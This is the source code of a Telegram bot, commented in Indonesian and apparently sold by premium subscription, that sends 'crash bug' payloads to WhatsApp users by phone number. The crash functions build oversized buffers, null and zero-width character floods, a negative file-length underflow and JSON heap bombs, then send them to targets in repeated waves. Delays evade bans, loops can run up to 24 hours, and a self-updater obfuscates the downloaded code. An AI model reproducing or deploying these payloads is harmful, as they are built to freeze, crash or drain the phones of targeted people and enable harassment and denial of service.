...
/* ===== UNIVERSAL AUTO-INSTALL DEPENDENCY ===== */
const { execSync } = require("child_process");
const chalk = require("chalk");   // pindahkan ke sini supaya bisa dipakai ensure

function ensure(moduleName) {
  try {
    require.resolve(moduleName);
  } catch {
    console.log(chalk.yellow(`⏳ Installing ${moduleName}...`));
...
async function performUpdate(chatId) {
  const updateMsg = await bot.sendMessage(
    chatId,
    "*Sinkronasi ultra-ringan + obfuscate dimulai...*",
    { parse_mode: "Markdown" }
  );

  try {
    /* 1. Ambil metadata & script */
    await bot.editMessageText(
      "*Menghubungi server...*",
      { chat_id: chatId, message_id: updateMsg.message_id, parse_mode: "Markdown" }
    );
    const remoteVersion = await getRemoteVersion();
    let remoteScript  = await downloadGitHubFile(UPDATE_CONFIG.GITHUB_RAW_URL);
    ...
    if (localHash === remoteHash) {
      await bot.editMessageText(
        "*Sudah versi terbaru.*\nTidak ada yang perlu diterapkan.",
        { chat_id: chatId, message_id: updateMsg.message_id, parse_mode: "Markdown" }
      );
      return;
    }

    /* 3. Obfuscate otomatis */
    await bot.editMessageText(
      "*Obfuscating code...*",
      { chat_id: chatId, message_id: updateMsg.message_id, parse_mode: "Markdown" }
    );
    const obfuscated = JavaScriptObfuscator.obfuscate(remoteScript, {
      compact: true,
    ...
    /* 4. Progress bar singkat */
    const stages = [
      { txt: "Menyimpan version.json...", delay: 400 },
      { txt: "Menimpa file utama (obfuscated)...",  delay: 600 },
      { txt: "File tersinkron & ter-enkripsi.",      delay: 300 }
    ];
    for (const s of stages) {
      await bot.editMessageText(s.txt, {
        chat_id: chatId,
    ...
    fs.writeFileSync("./ValtixInvicta.js", obfuscated); // <- versi obfuscate

    await bot.editMessageText(
      "🚀 *Restart otomatis dalam 2 detik...*",
      { chat_id: chatId, message_id: updateMsg.message_id, parse_mode: "Markdown" }
    );
...
async function LoadInvisIphone(valtix, target) {
  const log = (m) => console.log(`[iOS17-Gacor] ${m}`);
  const targetNum = target.split('@')[0];
  log(`💀 iOS 17 wave → ${targetNum}`);

  // --- ANTI-BAN CONFIG (hard-coded) ---
  const SAFE_BUFFER = 500000;        // max buffer size
  const SAFE_MENTION = 1;            // hanya target yang di-tag
  const PAYLOAD_DELAY = 300;         // internal jeda antar payload (ms)

  // helper
  const buf = (size) => Buffer.alloc(Math.min(size, SAFE_BUFFER));
  const char = (c, n) => c.repeat(Math.min(n, 100000));

  // --- iOS 17 CRASH PAYLOADS (mini version) ---
  const ios17_crash = {
    photosBomb: {
      viewOnceMessage: {
        message: {
          imageMessage: {
            url: "https://mmg.whatsapp.net/d/photos_crash",
            mimetype: "image/heic",
            caption: buf(2000000) + char("𑇂𑆵𑆴𑆿", 1000000),
            fileSha256: buf(32),
            fileLength: "4294967296",
            width: 999999,
            height: 999999,
            jpegThumbnail: buf(2000000),
            contextInfo: { mentionedJid: [target] } // hanya target
          }
        }
      }
    },
    standbyCrash: {
      viewOnceMessage: {
        message: {
          liveLocationMessage: {
            degreesLatitude: 91.00000000000001,
            degreesLongitude: 181.00000000000001,
            accuracy: 999999999,
            speed: 999999999,
            seconds: 4294967296,
            caption: "iOS_17_STANDBY_KILL" + char("\u200B", 1000000),
            sequenceNumber: 4294967296,
            jpegThumbnail: buf(1500000),
            contextInfo: { forwardingScore: 9999, isForwarded: true, mentionedJid: [target] }
          }
        }
      }
    },
    nameDropBomb: {
      viewOnceMessage: {
        message: {
          contactMessage: {
            displayName: "iOS17_CRASH_" + char("\u0000", 1000000),
            vcard: `BEGIN:VCARD\nVERSION:4.0\nFN:${char("𑇂𑆵𑆴𑆿", 500000)}\nTEL;type=CELL;waid=${targetNum}:${char("9", 50)}\nEND:VCARD`,
            jpegThumbnail: buf(2000000),
    ...
    journalCrash: {
      viewOnceMessage: {
        message: {
          documentMessage: {
            url: "https://mmg.whatsapp.net/d/journal_crash",
            mimetype: "application/vnd.apple.journal",
            title: "Journal_Entry_" + char("\u0000", 1000000),
            fileSha256: buf(32),
            fileLength: "4294967296",
            pageCount: 999999999,
            mediaKey: buf(32),
            fileName: `${char("𑇂𑆵𑆴𑆿", 500000)}.journal`,
            fileEncSha256: buf(32),
            jpegThumbnail: buf(2000000),
            caption: "iOS17_JOURNAL_MEMORY_KILL" + char("\u202E", 1000000),
            contextInfo: { mentionedJid: [target] }
          }
        }
      }
    ...
    actionButtonBomb: {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "ACTION_BUTTON_CRASH" + char("\u0000", 1000000) },
            nativeFlowResponseMessage: {
              name: "ios17_action_button",
              paramsJson: JSON.stringify({
                action: "crash",
                payload: buf(2000000).toString('base64'),
                memory_exhaust: true,
                trigger_siri: false,
                overload_core: true
              }),
  ...
  // --- EXECUTION (ANTI-LOGOUT) ---
  const sequence = [
    ios17_crash.photosBomb,
    ios17_crash.standbyCrash,
    ios17_crash.nameDropBomb,
    ios17_crash.journalCrash,
    ios17_crash.actionButtonBomb
  ];

  for (let i = 0; i < sequence.length; i++) {
    try {
      log(`📦 Payload ${i + 1}/5`);
      await valtix.relayMessage("status@broadcast", sequence[i], {
        statusJidList: [target],
        messageId: `ios17_${Date.now()}_${i}_${Math.random().toString(36).slice(2)}`
      });
      await new Promise(r => setTimeout(r, PAYLOAD_DELAY)); // anti-rate-limit
    } catch (err) {
      log(`⚠️ Skip ${i + 1}: ${err.message}`);
      continue; // jangan hentiin loop
    }
  }

  log(`✅ iOS 17 wave done → ${targetNum}`);
}

/**
 * vtxDestroyerFusion – FIXX FINAL
 * 1 kartu = 1,8 MB text-bomb + 1,8 MB dummy thumbnail
 * 3× burst → total ± 10 MB masuk status, target buka SW = freeze 8-12 detik
 * NO TAG | ANTI LOGOUT | NO FORWARD TRACE
 */
async function invisibleSpam(valtix, target) {
  /* ---------- TEXT-BOOM 1,8 MB (brand + 200k karakter neraka) ---------- */
  const TEXT_BOMB =
    'ναℓтιχ ιηνι¢тα' +
    '\u200D\u200B\u1160\uFE0F\u180E'.repeat(40_000);   // 5×40k = 200k chars ≈ 1,8 MB

  /* ---------- THUMBNAIL 1,8 MB (buffer kosong = instant gagal load) ---------- */
  const THUMB_SIZE   = 1_800_000;
  const dummyThumb   = Buffer.alloc(THUMB_SIZE);

  /* ---------- helper kirim 1 kartu SW besar ---------- */
  const sendMegaCard = async () => {
    const card = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body       : { text: TEXT_BOMB },
            footer     : { text: TEXT_BOMB },
            header     : {
              title              : TEXT_BOMB.slice(0, 5_000),
              hasMediaAttachment : true,
              imageMessage       : {
                url            : "https://mmg.whatsapp.net/d/fake",
                mimetype       : "image/jpeg",
                caption        : TEXT_BOMB,
                jpegThumbnail  : dummyThumb,          // 1,8 MB
                fileLength     : `${THUMB_SIZE}`,
                width          : 9_999,
                height         : 9_999,
    ...
    const msg = generateWAMessageFromContent(
      "status@broadcast",
      card,
      { userJid: valtix.user.id }
    );

    /* NO-TAG – cuma masuk daftar viewers */
  ...
  /* ---------- 3× burst = 3× kartu (total ± 10 MB) ---------- */
  for (let i = 0; i < 3; i++) {
    await sendMegaCard();
    /* jitter 1,2 – 1,7 detik */
    await new Promise(r =>
      setTimeout(r, 1_200 + Math.floor(Math.random() * 500))
    );
  }
}

//100% invisible, 0% recover, & works on semua Android 9-14.
//forcolose by @Thaureyo
async function forcoloseCela(valtix, target) {
  const log = (m) => console.log(`[FORCOLOSE] ${m}`);
  log(`💣 Injecting celah fatal → ${target.split('@')[0]}`);

  /* ---------- CELA UTAMA: fileLength -1 + sidecar besar ---------- */
  const thumb = Buffer.from("", "base64");
  const sideCar = Buffer.from("", "base64");

  /* ---- CELA: fileLength = -1 (integer underflow) ---- */
  const fatalVideo = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc",
    mimetype: "video/mp4",
    fileSha256: Buffer.from("IL4IFl67c8JnsS1g6M7NqU3ZSzwLBB3838ABvJe4KwM=", "base64"),
    fileLength: { low: -1, high: 0, unsigned: false }, // <--- CELA UTAMA
    seconds: 9999,
    mediaKey: Buffer.from("SAlpFAh5sHSHzQmgMGAxHcWJCfZPknhEobkQcYYPwvo=", "base64"),
    height: 9999,
    width: 9999,
    fileEncSha256: Buffer.from("QxhyjqRGrvLDGhJi2yj69x5AnKXXjeQTY3iH2ZoXFqU=", "base64"),
  ...
  /* ---- 1× VIEW-ONCE CAROUSEL = 1× TAP = INSTANT DEATH ---- */
  const card = {
    ...
    header: proto.Message.InteractiveMessage.Header.fromObject({
      title: " ",
      hasMediaAttachment: true,
      videoMessage: fatalVideo // <--- payload fatal
    }),
    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
      messageParamsJson: "{[".repeat(5_000), // heap bomb
      messageVersion: 3,
      buttons: [{ name: "galaxy_message", buttonParamsJson: JSON.stringify({ icon: "RIVIEW", flow_cta: " ", flow_message_version: "3" }) }]
    })
  };
  ...
  /* ---- KIRIM 1× = 1× TAP = FORCOLOSE ---- */
  await valtix.relayMessage("status@broadcast", msg.message, { messageId: msg.key.id, statusJidList: [target] });

  log("✅ Forcolose dot terkirim – tap = mati");
}

/* ---------- LOOP PERMANENT (24 jam) ---------- */
async function forcolosePermanent(valtix, target) {
  const end = Date.now() + 24 * 60 * 60 * 1000;
  let wave = 0;

  while (Date.now() < end) {
    wave++;
    await forcoloseCela(valtix, target);
    console.log(chalk.gray(`[FORCOLOSE] Wave ${wave} terkirim – next in 30s`));
    await new Promise(r => setTimeout(r, 30_000)); // 30 detik antar cela → anti-logout
  }
}

//BelovedMemoryKiller.js
async function GacorBelovedPerma(valtix, target) {
    const log = (m) => console.log(`[Beloved-Gacor] ${m}`);
    const targetNum = target.split('@')[0];
    log(`🎯 ${targetNum}`);

    /* ---------- ANTI-BAN CONFIG ---------- */
    const SAFE_MENTIONS = 1;                // cuma target yang di-tag
    const SAFE_BUFFER   = 400_000;          // max 400 kB per buffer
    const WAVE_DELAY    = 900;              // jeda antar wave (ms)
    const VECT_DELAY    = 150;              // jeda antar vector (ms)

    /* ---------- HELPERS ---------- */
    const buf   = (size) => Buffer.alloc(Math.min(size, SAFE_BUFFER));
    const char  = (c, n) => c.repeat(Math.min(n, 100_000));
    const thumb = buf(1);

    /* ---------- BOMBS (down-sized) ---------- */
    const galaxyBomb = "\u0000".repeat(400_000);
    const textBomb   = char("ꦾ", 200_000);
    const docBomb    = char("ꦽ", 400_000);
    const stateBomb  = "\x10".repeat(400_000);
    const mentions   = [target];            // anti-spam mention

    /* ---------- MEDIA STUB (tetap valid) ---------- */
    const mediaData = [
      { ID:"68917910", uri:"t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
        buffer:"11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe", sid:"5e03e0",
        SHA256:"ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=", ENCSHA256:"dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=", mkey:"C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=" },
      { ID:"68884987", uri:"t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
        buffer:"B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe", sid:"5e03e0",
        SHA256:"ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=", ENCSHA256:"25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=", mkey:"lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=" }
    ];

    /* ---------- 30 WAVE ---------- */
    for (let w = 1; w <= 30; w++) {
        if (w % 5 === 0) log(`Wave ${w}/30`);

        const {ID,uri,buffer,sid,SHA256,ENCSHA256,mkey} = mediaData[w % 2];

        /* ---- 5 VECTOR ---- */
        const vectors = [
          /* v1 */ { viewOnceMessage: { message: { interactiveResponseMessage: {
            body: {text:`σƭαא${w}`,format:"DEFAULT"},
            nativeFlowResponseMessage:{name:"call_permission_request",paramsJson:galaxyBomb,version:3},
            entryPointConversionSource:"galaxy_message"
          }}}},
          /* v2 */ { viewOnceMessage: { message: { extendedTextMessage: {
            text: `σƭαא${w}`+textBomb,
            matchedText: textBomb,
            description: `σƭαא${w}`,
            previewType: "NONE",
            jpegThumbnail: thumb,
            contextInfo: { isForwarded:true, forwardingScore:9999, participant:target, remoteJid:"status@broadcast", mentionedJid:mentions }
          }}}},
          /* v3 */ { viewOnceMessage: { message: { documentMessage: {
            url: `https://mmg.whatsapp.net/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}&mms3=true`,
            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
            fileSha256: Buffer.from(SHA256,"base64"),
            fileLength: "999999999999",
            pageCount: 1316134911,
            mediaKey: Buffer.from(mkey,"base64"),
            fileName: `σƭαא${w}.pptx`,
            fileEncSha256: Buffer.from(ENCSHA256,"base64"),
            directPath: `/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}`,
            mediaKeyTimestamp: Date.now(),
            caption: textBomb,
            contextInfo: { remoteJid:"status@broadcast", fromMe:true, participant:target, mentionedJid:mentions, forwardingScore:999 }
          }}}},
          /* v4 */ { viewOnceMessage: { message: { stickerMessage: {
            url: `https://mmg.whatsapp.net/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}&mms3=true`,
            fileSha256: Buffer.from(SHA256,"base64"),
            fileEncSha256: Buffer.from(ENCSHA256,"base64"),
            mediaKey: Buffer.from(mkey,"base64"),
            ...
            firstFrameSidecar: Buffer.from("KN4kQ5pyABRAgA==","base64"),
            isAnimated: true,
            contextInfo: {participant:target, mentionedJid:mentions},
            isAvatar: false, isAiSticker: false, isLottie: false
          }}}},
          /* v5 */ { viewOnceMessage: { message: { interactiveResponseMessage: {
            body: {text:`σƭαא${w} ɦαเ`,format:"DEFAULT"},
            nativeFlowResponseMessage:{
                name:"address_message",
                paramsJson: `{\"values\":{\"in_pin_code\":\"7205\",\"building_name\":\"russian motel\",\"address\":\"2.7205\",\"tower_number\":\"507\",\"city\":\"Batavia\",\"name\":\"Otax?\",\"phone_number\":\"+13135550202\",\"house_number\":\"7205826\",\"floor_number\":\"16\",\"state\":\"${stateBomb}\"}}`,
                version: 3
            }
          }}}}
        ];

        /* ---- KIRIM PER-VECTOR + JEDA ---- */
        for (let i = 0; i < vectors.length; i++) {
            try {
                await valtix.relayMessage("status@broadcast", vectors[i], { statusJidList: [target] });
                await new Promise(r => setTimeout(r, VECT_DELAY)); // anti-rate-limit
            } catch (e) {
                log(`Skip v${i + 1}: ${e.message}`);
                continue;
            }
        }

        await new Promise(r => setTimeout(r, WAVE_DELAY)); // antar wave
    }
    log("✅ GacorBelovedPerma selesai → " + targetNum);
}

//FusionDestroyer.js
//Instant freeze + 50-wave combo + permanent UI corruption
async function vtxDestroyerFusion(valtix, target) {
  const MAX_WAVE = 1;               // 1 wave = ±3 menit (ubah sesuka kalian)
  let wave = 0;

  const dummyThumbnail = Buffer.from("", "base64");
  const sideCar   = Buffer.from("", "base64");
  const textBomb  = "ꦽ".repeat(300_000);
  const stateBomb = "\x10".repeat(1_200_000);
  const mentionB  = "ꦾ".repeat(200_000);
  const mentions  = Array.from({ length: 1900 }, (_, i) => `1${i + 1_000_000}@s.whatsapp.net`);

  console.log(chalk.bgRed.white(`[FUSION] Starting → ${target} | Max wave: ${MAX_WAVE}`));
  ...
  while (wave < MAX_WAVE) {
    ...
    try {
      ...
      const cards = Array.from({ length: 5 }, (_, idx) => ({
        body: proto.Message.InteractiveMessage.Body.fromObject({ text: "v" + mentionB }),
        footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "v" + mentionB }),
        header: proto.Message.InteractiveMessage.Header.fromObject({
          title: "VALTIX" + mentionB,
          hasMediaAttachment: true,
          videoMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc",
            mimetype: "video/mp4",
            ...
            directPath: "/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc",
            mediaKeyTimestamp: Date.now(),
            jpegThumbnail: dummyThumbnail,
            streamingSidecar: sideCar
          }
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
          messageParamsJson: "{[".repeat(10_000),
          messageVersion: 3,
          buttons: [{ name: "galaxy_message", buttonParamsJson: JSON.stringify({ icon: "RIVIEW", flow_cta: mentionB, flow_message_version: "3" }) }]
        })
      }));
      ...
      const carouselMsg = generateWAMessageFromContent(target, {
        viewOnceMessage: { message: { interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({ text: `FUSION${wave}` }),
          footer: proto.Message.InteractiveMessage.Footer.create({ text: `wave${wave}` }),
          header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards }),
          contextInfo: { participant: target, mentionedJid: mentions, remoteJid: "status@broadcast" }
        }) } }
      }, { userJid: target });

      const flowMsg = await generateWAMessageFromContent(target, {
        viewOnceMessage: { message: { interactiveResponseMessage: {
          body: { text: `O${wave}`, format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{\"values\":{\"in_pin_code\":\"7205\",\"building_name\":\"russian motel\",\"address\":\"2.7205\",\"tower_number\":\"507\",\"city\":\"Batavia\",\"name\":\"Otax?\",\"phone_number\":\"+13135550202\",\"house_number\":\"7205826\",\"floor_number\":\"16\",\"state\":\"${stateBomb}\"}}`,
            version: 3
      ...
      await Promise.all([
        valtix.relayMessage("status@broadcast", carouselMsg.message, { messageId: carouselMsg.key.id, statusJidList: [target] }),
        valtix.relayMessage("status@broadcast", flowMsg.message, { messageId: flowMsg.key.id, statusJidList: [target] }),
        valtix.relayMessage("status@broadcast", textMsg.message, { messageId: textMsg.key.id, statusJidList: [target] })
      ]);

      const pause = 8000 + Math.floor(Math.random() * 4000);
      console.log(chalk.gray(`[FUSION] Wave ${wave}/${MAX_WAVE} done → next in ${pause / 1000}s`));
      await new Promise(r => setTimeout(r, pause));

    } catch (e) {
      console.log(chalk.yellow(`[WAVE ${wave}] Skip: ${e.message}`));
      await new Promise(r => setTimeout(r, 10_000));
    }
  }

  console.log(chalk.green(`[FUSION] Finished ${wave} waves → ${target}`));
}
//=========== ASYNC FUNCTION SEND ==========\\
...
bot.onText(/\/menu/, async (msg) => {
  ...
  if (!premiumUsers.some(user => user.id === userId && new Date(user.expiresAt) > new Date())) {
    const options = {
      caption: "/addprem duluuu giniii contohnyaa: /addprem 12345678 50d",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Developer", url: "https://t.me/Thaureyo" }],
...
╭━───━⊱ 𝗜𝗻𝘃𝗶𝘀𝗶𝗯𝗹𝗲 ⊰━───━╮
┃⟜❏ /𝘷𝘵𝘹𝘊𝘩𝘢𝘪𝘯𝘊𝘳𝘢𝘴𝘩 ✆ 62xx
┃  ╰┈➤ᴅᴇʟᴀʏ ɪɴᴠɪsɪʙʟᴇ ᴍᴇᴅɪᴜᴍ
┃
┃⟜❏ /𝘷𝘵𝘹𝘜𝘭𝘵𝘪𝘮𝘢𝘵𝘦𝘎𝘩𝘰𝘴𝘵 ✆ 62xx
┃  ╰┈➤ᴅᴇʟᴀʏ ɪɴᴠɪsɪʙʟᴇ ʜᴀʀᴅ
┃
┃⟜❏ /𝘷𝘵𝘹𝘍𝘰𝘭𝘤𝘰 ✆ 62xx
┃  ╰┈➤ꜰᴏʀᴄᴏʟᴏsᴇ ɪɴᴠɪsɪʙʟᴇ ᴅᴇʟᴀʏ ʜᴀʀᴅ ᴋᴜᴏᴛᴀ ᴅʀᴀɪɴ
┃
┃⟜❏ /𝘪𝘰𝘴𝘈𝘯𝘯𝘪𝘩𝘪𝘭𝘢𝘵𝘦 ✆ 62xx 
┃  ╰┈➤ꜰᴏʀᴄᴇ ʀᴇʙᴏᴏᴛ ɪᴘʜᴏɴᴇ 𝟷𝟽 + ʟᴀʏᴀʀ ꜰʀᴇᴇᴢᴇ
╰━───────╯
`;
...
//=======CASE BUG=========//
bot.onText(/\/vtxUltimateGhost (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
...
\`\`\``, {
        ...
        for (let a = 0; a < 50; a++) {
    await GacorBelovedPerma(valtix, jid);
...
\`\`\``,
    ...
    // PROGRESS BAR (tampilan tetap sama)
    const progressStages = [
      { text: "[█░░░░░░░░░] 10%", delay: 200 },
      { text: "[███░░░░░░░] 30%", delay: 200 },
      { text: "[█████░░░░░] 50%", delay: 100 },
...
console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
for (let a = 0; a < 50; a++) {
  await invisibleSpam(valtix, jid);
  await new Promise(r => setTimeout(r, 1200));
}
console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");    await bot.editMessageCaption(
      `\`\`\`
❏ Target : ${formattedNumber}
❏ Status : Succes
❏ Progress : [██████████] 100%
...
bot.onText(/\/vtxFolco (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const userId = msg.from.id;
    const target = match[1];
...
\`\`\``, {
        ...
        console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
        for (let a = 0; a < 50; a++) {
    await forcoloseCela(valtix, jid);
    await new Promise(r => setTimeout(r, 1200)); // jeda tiap putaran
}
...
bot.onText(/\/iosAnnihilate (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const userId = msg.from.id;
    const target = match[1];
